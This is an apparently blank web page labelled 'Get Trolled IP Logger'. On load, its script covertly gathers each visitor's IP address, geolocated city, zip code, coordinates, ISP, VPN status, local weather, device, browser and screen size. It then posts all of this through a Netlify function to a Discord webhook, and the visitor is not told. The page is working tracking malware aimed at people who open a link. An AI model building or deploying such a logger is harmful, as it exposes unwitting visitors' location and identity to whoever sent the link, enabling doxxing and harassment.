<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      color: red;
      user-select: none;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: monospace, monospace;
      font-size: 1rem;
      text-align: center;
      padding: 10px;
    }
    #error-message {
      cursor: pointer;
      user-select: text;
      max-width: 90vw;
      word-break: break-word;
      display: none;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <div id="error-message" title="Click to copy error message"></div>

<script>
  const netlifyFunctionUrl = "/.netlify/functions/log-ip";

  function safeGet(obj, path, defaultValue = '') {
    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
  }

  function safeValue(val, maxLen=1024) {
    if (val === undefined || val === null || val === '') return "N/A";
    val = val.toString();
    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
    return val;
  }

  function parseUserAgent(ua) {
    let device = "Unknown Device";
    let os = "Unknown OS";
    let browser = "Unknown Browser";

    if (/Android/.test(ua)) {
      os = "Android";
      const match = ua.match(/Android.*;\s([^)]+)\)/);
      if (match) device = match[1];
    } else if (/iPhone/.test(ua)) {
      os = "iOS (iPhone)";
      device = "iPhone";
    } else if (/iPad/.test(ua)) {
      os = "iOS (iPad)";
      device = "iPad";
    } else if (/Windows NT/.test(ua)) {
      os = "Windows";
    } else if (/Mac OS X/.test(ua)) {
      os = "Mac OS";
    }

    if (/Chrome\/\d+/.test(ua)) {
      browser = "Chrome";
    } else if (/Firefox\/\d+/.test(ua)) {
      browser = "Firefox";
    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
      browser = "Safari";
    } else if (/Edg\/\d+/.test(ua)) {
      browser = "Edge";
    }

    return { device, os, browser };
  }

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function fetchWeather(lat, lon) {
    if (!lat || !lon) return null;
    const url = `https://wttr.in/${lat},${lon}?format=j1`;
    const res = await fetch(url);
    if (!res.ok) return null;
    return res.json();
  }

  async function sendDiscordWebhook(embed) {
    const res = await fetch(netlifyFunctionUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });
    if (!res.ok) {
      const text = await res.text();
      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
    }
  }

  (async () => {
    const errorDiv = document.getElementById('error-message');

    try {
      const data = await fetchIPInfo();
      const weatherData = await fetchWeather(data.latitude, data.longitude);
      const uaInfo = parseUserAgent(navigator.userAgent);
      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });

      let weather = null;
      if (weatherData && weatherData.current_condition && weatherData.current_condition.length > 0) {
        weather = weatherData.current_condition[0];
      }

      let weatherDescription = "N/A";
      if (weather && weather.lang_en && Array.isArray(weather.lang_en) && weather.lang_en.length > 0) {
        weatherDescription = weather.lang_en[0].value || "N/A";
      }

      const embed = {
        title: "🕵️ New Visitor Logged",
        color: 0x00ffff,
        timestamp: new Date().toISOString(),
        footer: {
          text: "Get Trolled IP Logger",
          icon_url: "https://i.imgur.com/qZ7j0fV.png"
        },
        thumbnail: {
          url: safeValue(data.country_flag, 200)
        },
        author: {
          name: "Get Trolled IP Logger",
          url: "https://discord.com",
          icon_url: "https://i.imgur.com/qZ7j0fV.png"
        },
        fields: [
          { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
          { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
          { name: "Hostname", value: safeValue(data.hostname), inline: true },
          { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
          { name: "Region", value: safeValue(data.region), inline: true },
          { name: "City", value: safeValue(data.city), inline: true },
          { name: "Zip", value: safeValue(data.postal), inline: true },
          { name: "Latitude", value: safeValue(data.latitude), inline: true },
          { name: "Longitude", value: safeValue(data.longitude), inline: true },
          { name: "ISP", value: safeValue(data.isp), inline: false },
          { name: "Organization", value: safeValue(data.org), inline: false },
          { name: "ASN", value: safeValue(data.asn), inline: true },
          { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
          { name: "Local Time", value: safeValue(localTime), inline: true },
          { name: "Currency", value: `${safeValue(safeGet(data, ['currency', 'code']))} (${safeValue(safeGet(data, ['currency', 'name']))})`, inline: true },
          { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
          { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
          { name: "Mobile", value: safeValue(safeGet(data, ['security', 'is_mobile']) ? "Yes" : "No"), inline: true },
          { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
          ...(weather ? [
            { name: "Weather", value: `${safeValue(weatherDescription)} - Feels like ${safeValue(weather.FeelsLikeC)}°C`, inline: true },
            { name: "Temperature", value: `${safeValue(weather.temp_C)}°C`, inline: true },
            { name: "Humidity", value: `${safeValue(weather.humidity)}%`, inline: true },
            { name: "Wind Speed", value: `${safeValue(weather.windspeedKmph)} km/h`, inline: true },
          ] : []),
          { name: "Device Model", value: safeValue(uaInfo.device), inline: true },
          { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
          { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
          { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
          { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
        ]
      };

      await sendDiscordWebhook(embed);

    } catch (err) {
      const errorDiv = document.getElementById('error-message');
      errorDiv.style.display = "block";
      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy error message.`;
      errorDiv.onclick = () => {
        navigator.clipboard.writeText(err.message)
          .then(() => alert("Error message copied! Send it to me."))
          .catch(() => alert("Failed to copy error message."));
      };
    }
  })();
</script>
</body>
</html>
